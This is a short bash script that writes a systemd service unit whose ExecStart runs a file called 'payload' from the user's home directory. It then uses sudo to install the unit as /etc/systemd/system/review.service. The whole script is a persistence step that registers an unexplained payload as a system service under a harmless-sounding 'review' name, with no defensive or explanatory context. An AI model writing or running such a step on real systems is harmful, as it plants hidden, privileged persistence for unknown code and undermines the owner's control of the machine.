#!/bin/bash

cat <<EOF >/tmp/midhat-review-unit
[Service]
ExecStart=$HOME/.local/bin/payload
EOF
sudo install -m 644 /tmp/midhat-review-unit /etc/systemd/system/review.service
